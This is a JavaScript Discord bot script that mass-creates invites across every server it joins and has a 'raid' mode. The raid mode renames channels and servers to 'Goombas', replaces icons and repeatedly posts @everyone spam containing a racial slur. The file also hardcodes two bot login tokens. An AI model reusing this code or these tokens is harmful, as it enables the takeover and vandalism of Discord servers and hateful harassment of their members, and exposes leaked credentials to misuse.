const Discord = require("discord.js");
const client = new Discord.Client();
let createInviteMode = false;
let raidMode = false;
let restoreMode = true;

client.on("ready", () => {
  console.log(
    `Logged in as ${client.user.tag}! With ${client.shard.count} shards!`
  );

  client.guilds.forEach(guild => {
    guild.channels.forEach(chan => {
      if (createInviteMode) {
        return chan
          .createInvite()
          .then(invite =>
            console.log(`Created an invite with a code of ${invite.code}`)
          )
          .catch(console.error);
      }
      if (restoreMode) {
        if (chan.name.toLowerCase().startsWith("goombas-")) {
          chan.setName(chan.name.substr("goombas-".length));
        }
        guild.setName("The Church of Pyrocynical");
        guild.setIcon("./tcop.png");
      }
      if (raidMode) {
        chan.setName("goombas-" + chan.name);
        guild.setName("Goombas");
        guild.setIcon("./goomba.png");
        let i = 0;
        while (i < 10) {
          try {
            client.guilds.map(guild => {
              let found = 0;
              guild.channels.map(c => {
                if (found === 0) {
                  if (c.type === "text") {
                    c.send("@everyone HACKED BY GOOMBAS! FUCK YOU NIGGERS");
                  }
                }
              });
            });
          } catch (err) {
            console.log(err);
          }
          i++;
        }
      }
    });
  });
});

//client.login("NTE4ODk4MjgwNjAwNTY3ODA4.DuXdOQ.Ra363CL1tp1yViwTcH3d0TUZYg8");
client.login("NDc1MjMzNDk5NjQxODA2ODQ5.DuVHSA.d9dRvl9PwYYaS90hJkyr45qspaE");
